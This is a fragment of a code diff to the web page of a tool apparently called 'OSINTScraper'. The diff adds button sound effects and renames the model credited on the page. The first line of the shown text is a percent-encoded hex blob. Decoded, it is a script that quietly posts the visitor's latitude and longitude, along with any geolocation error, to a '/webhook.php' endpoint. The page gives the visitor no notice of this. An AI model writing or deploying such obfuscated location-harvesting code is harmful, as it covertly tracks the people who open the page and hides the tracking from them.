20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%6c%61%74%6c%6f%6e%67%29%29%3b%0d%0a%20%20%7d%0d%0a%20%20%66%75%6e%63%74%69%6f%6e%20%63%61%74%63%68%45%72%72%6f%72%28%65%72%72%6f%72%29%20%7b%0d%0a%20%20%20%20%73%77%69%74%63%68%28%65%72%72%6f%72%2e%63%6f%64%65%29%20%7b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%50%45%52%4d%49%53%53%49%4f%4e%5f%44%45%4e%49%45%44%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%31%20%3d%20%22%5c%6e%55%73%65%72%20%64%65%6e%69%65%64%20%74%68%65%20%47%65%6f%6c%6f%63%61%74%69%6f%6e%20%70%65%72%6d%69%73%69%6f%6e%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%31%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%50%4f%53%49%54%49%4f%4e%5f%55%4e%41%56%41%49%4c%41%42%4c%45%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%31%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%31%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%31%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%32%20%3d%20%22%5c%6e%4c%6f%63%61%74%69%6e%20%55%6e%61%76%61%69%6c%61%62%6c%65%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%31%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%32%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%54%49%4d%45%4f%55%54%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%32%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%32%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%32%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%33%20%3d%20%22%5c%6e%54%69%6d%65%6f%75%74%20%45%72%72%6f%72%2e%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%32%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%33%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%20%20%63%61%73%65%20%65%72%72%6f%72%2e%55%4e%4b%4e%4f%57%4e%5f%45%52%52%4f%52%3a%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%78%68%72%33%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%33%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%33%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%63%6f%6e%73%74%20%70%65%72%72%6f%72%34%20%3d%20%22%5c%6e%55%6e%6b%6e%6f%77%6e%20%65%72%72%6f%72%5c%6e%22%0d%0a%20%20%20%20%20%20%20%20%78%68%72%33%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%65%72%72%6f%72%34%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%62%72%65%61%6b%3b%0d%0a%20%20%20%20%7d%0d%0a%20%20%7d%0d%0a%20%20%3c%2f%73%63%72%69%70%74%3e'));
 </script>
 <div style="text-align:center; margin:20px;">
-<button id="go-MindMap" onclick="window.location.href='/Diagram.html'"
+<button id="go-MindMap" onclick="playMindMapSound()"
         style="padding:26px 34px; border-radius:24px;">
   <span style="font-size:1.7em; font-weight:bold;">
     Go to Diagram
   </span>
 </button>
+
+<script>
+function playMindMapSound() {
+  const audio = new Audio("/sounds/sound1.mp3");
+
+  audio.play()
+    .then(() => {
+      audio.addEventListener("ended", () => {
+        window.location.href = "/Diagram.html";
+      });
+    })
+    .catch(error => {
+      console.error("Could not play sound:", error);
+      window.location.href = "/Diagram.html";
+    });
+}
+</script>
 </div>
 <div style="max-width: 867px; margin: 20px auto; padding: 20px; text-align: center; font-family: Arial, sans-serif; font-size: 14px; color: #ccc; line-height: 1.6;">
 <div class="page-info">
   <p>
-OSINTScraper uses different techniques commonly used when using public information to gather and analyze data on individuals or entities. Powered by GPT‑5, it’s a recent innovation still in beta, so occasional bugs or unexpected behavior may occur.
+OSINTScraper uses different techniques commonly used when using public information to gather and analyze data on individuals or entities. Powered by GPT‑6 Astra, it’s a recent innovation still in beta, so occasional bugs or unexpected behavior may occur.
   </p>
   <p>
     We kindly ask you to leave a review or report of your experience on our Socials Medias.<br> 
@@ -749,7 +843,9 @@ OSINTScraper uses different techniques commonly used when using public informati
   }
 
   if (settingsBtn && settingsSidebar && closeSidebar) {
-    settingsBtn.addEventListener("click", () => {
+settingsBtn.addEventListener("click", () => {
+  const audio = new Audio("/sounds/sound1.mp3");
+  audio.play().catch(error => console.error("Could not play sound:", error));
       settingsSidebar.classList.add("active");
       sidebarOverlay.classList.add("active");
     });
